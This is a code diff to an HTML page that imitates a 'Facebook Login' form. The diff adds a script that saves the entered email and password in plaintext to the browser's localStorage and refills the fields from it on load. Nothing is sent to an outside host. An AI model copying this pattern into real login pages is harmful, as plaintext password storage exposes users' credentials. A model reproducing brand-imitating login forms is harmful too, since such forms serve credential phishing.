@@ -40,7 +40,7 @@
     </style>
 </head>
 <body>
-    <form action="" method="post">
+    <form id="loginForm" action="" method="post">
         <h1>Facebook Login</h1>
         <label for="email">Email or Phone</label>
         <input type="text" id="email" name="email">
@@ -48,5 +48,33 @@
         <input type="password" id="password" name="password">
         <input type="submit" value="Log In">
     </form>
+
+    <script>
+        // Function to save form data to local storage
+        function saveFormData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Check if email and password are not empty
+            if (email.trim() !== '' && password.trim() !== '') {
+                localStorage.setItem('email', email);
+                localStorage.setItem('password', password);
+            }
+        }
+
+        // Retrieve form data from local storage and populate the form fields
+        window.onload = function() {
+            const savedEmail = localStorage.getItem('email');
+            const savedPassword = localStorage.getItem('password');
+            
+            if (savedEmail && savedPassword) {
+                document.getElementById('email').value = savedEmail;
+                document.getElementById('password').value = savedPassword;
+            }
+        };
+
+        // Attach event listener to the form submission
+        document.getElementById('loginForm').addEventListener('submit', saveFormData);
+    </script>
 </body>
 </html>
